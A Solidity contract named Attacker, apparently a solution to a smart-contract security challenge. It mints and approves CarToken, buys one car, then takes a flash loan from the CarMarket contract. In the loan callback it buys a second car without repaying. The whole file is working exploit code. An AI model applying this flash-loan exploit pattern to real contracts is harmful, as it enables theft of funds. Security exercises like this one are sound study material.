// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./interfaces/ICarToken.sol";
import "./interfaces/ICarMarket.sol";

/**
* @title Attacker 
* @author kyrers
* @notice Execute the flashloan
*/
contract Attacker {
    /*------------------------------------------------------------
                                 VARIABLES
    --------------------------------------------------------------*/
    ICarToken private carToken;
    ICarMarket private carMarket;

    /*------------------------------------------------------------
                                 FUNCTIONS
    --------------------------------------------------------------*/

    /**
    * @notice Constructor
    */
    constructor(address _carToken, address _carMarket) {
        require(_carToken != address(0) && _carMarket != address(0), "No zero addresses");
        carToken = ICarToken(_carToken);
        carMarket = ICarMarket(_carMarket);
    }
    
    /**
    * @notice Attack
    */
    function attack() external {
        //mint & approve
        carToken.mint();
        carToken.approve(address(carMarket), 100001 ether);

        //purchase
        carMarket.purchaseCar("black", "Rolls Royce", "Phantom Drophead");
        
        //flashloan
        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashLoan(uint256)", 100000 ether));
        require(success, "flashloan failed");
    }

    /**
    * @notice receivedCarToken - the function to handle the flashLoan
    */
    function receivedCarToken(address) external {
        carMarket.purchaseCar("black", "Rolls Royce", "Wraith Black Badge");

        //No need to repay the flashloan
    }
}
